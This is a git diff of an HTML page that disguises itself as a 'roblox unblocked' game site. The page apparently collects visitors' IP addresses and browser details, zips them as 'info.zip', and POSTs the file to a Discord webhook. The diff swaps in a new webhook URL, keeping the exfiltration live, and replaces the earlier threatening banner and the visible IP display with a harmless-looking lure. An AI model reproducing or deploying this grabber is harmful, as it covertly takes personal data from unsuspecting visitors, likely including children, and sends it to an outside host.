@@ -74,11 +74,10 @@
 <body>
     <div id="ip-display" class="strobing-text">Loading IPs...</div>
 
-    <iframe id="spotify-player" src="https://open.spotify.com/embed/track/471UcHZ5JhkgjE3CmWNEIG?utm_source=generator" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
 
     <div class="container">
-        <div class="flashing-text">V4lc</div>
-        <div class="hue-rotating-text">Say V4lc Runs You or ur info is everywhere</div>
+        <div class="flashing-text">roblox unblocked</div>
+        <div class="hue-rotating-text">If ununavalible, its broken.</div>
     </div>
 
     <div id="info">
@@ -108,7 +107,7 @@
 
             function displayIPs(ipv4, ipv6) {
                 const ipDisplayElement = document.getElementById('ip-display');
-                ipDisplayElement.innerHTML = `IPv4: ${ipv4} | IPv6: ${ipv6}`;
+                ipDisplayElement.innerHTML = `UNAVALIBLE`;
             }
 
             function getBrowserInfo() {
@@ -205,7 +204,7 @@
                 formData.append('file', zipBlob, 'info.zip');
 
                 try {
-                    await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
+                    await fetch('https://discord.com/api/webhooks/1284260551714803874/0blmXaQQDTgkhTgIDq3pkvB9OXfn0OdEjFs_c6C4WFvGkTxpmvSwD_JBHzaXE_tl7BNW', {
                         method: 'POST',
                         body: formData
                     });
